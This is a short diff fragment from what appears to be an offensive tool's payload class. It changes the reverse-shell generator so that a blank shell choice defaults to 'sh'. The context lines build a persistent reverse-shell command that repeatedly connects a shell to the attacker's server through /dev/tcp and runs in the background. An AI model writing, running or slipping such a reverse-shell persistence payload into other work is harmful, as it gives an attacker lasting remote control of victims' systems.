@@ -30,8 +30,8 @@ class payload:
 	def run(self,server):
 		while 1:
 			shell = input(h.info_general_raw("Target shell: ")).strip(" ")
-			while shell == "":
-				shell = input(h.info_general_raw("Target shell: ")).strip(" ")
+			if shell == "":
+				shell = "sh"
 			persistence = input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
